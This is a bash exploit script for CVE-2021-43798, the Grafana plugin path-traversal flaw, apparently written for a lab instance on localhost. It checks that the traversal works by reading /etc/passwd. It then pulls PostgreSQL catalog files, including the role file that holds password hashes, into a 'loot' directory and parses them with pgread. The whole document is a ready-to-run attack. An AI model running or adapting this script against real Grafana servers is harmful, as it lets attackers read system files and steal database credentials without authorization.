#!/bin/bash
# CVE-2021-43798 + pgread exploit
# Usage: ./exploit.sh <grafana_url>

TARGET="${1:-http://localhost:13000}"
OUTDIR="./loot"
mkdir -p "$OUTDIR"

echo "[*] Target: $TARGET"
echo "[*] Exploiting CVE-2021-43798 (Grafana LFI)"
echo

# Test LFI
echo "[*] Testing LFI..."
if ! curl -s --path-as-is "$TARGET/public/plugins/alertlist/../../../../../../../../etc/passwd" | grep -q "root:"; then
    echo "[-] LFI not working"
    exit 1
fi
echo "[+] LFI confirmed!"
echo

# PostgreSQL data directory path
PG_DATA="/var/lib/postgresql/data"

# Download PostgreSQL files
echo "[*] Downloading PostgreSQL files..."
curl -s --path-as-is "$TARGET/public/plugins/alertlist/../../../../../../../..$PG_DATA/global/1262" -o "$OUTDIR/1262"
curl -s --path-as-is "$TARGET/public/plugins/alertlist/../../../../../../../..$PG_DATA/global/1260" -o "$OUTDIR/1260"
curl -s --path-as-is "$TARGET/public/plugins/alertlist/../../../../../../../..$PG_DATA/global/pg_control" -o "$OUTDIR/pg_control"

echo "[+] Files downloaded to $OUTDIR/"
echo

echo "=== DATABASES ==="
pgread -f "$OUTDIR/1262" 2>/dev/null

echo
echo "=== PASSWORD HASHES ==="
echo "(For full extraction, copy entire data directory)"
ls -la "$OUTDIR/"
